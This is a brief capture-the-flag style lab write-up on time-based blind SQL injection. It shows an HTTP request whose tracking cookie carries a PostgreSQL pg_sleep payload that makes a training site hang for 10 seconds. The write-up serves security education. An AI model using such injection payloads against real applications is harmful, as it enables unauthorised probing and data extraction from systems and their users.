# Lab: Blind SQL injection with time delays

### Instructions

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 


### Solution

Capturing a request in Burp and beginning to test the `TrackingId` parameter, a time based blind SQL injection is discovered using the following PostgreSQL injection syntax:

```sql
GET /product?productId=14 HTTP/2
Host: 0aac006503ad8b358335b092008600de.web-security-academy.net
Cookie: TrackingId=acTKH1TuFh06us4L' || (SELECT pg_sleep(10))--
```

This causes the page to hang to 10 seconds, confirming the injection vulnerability and solving the lab.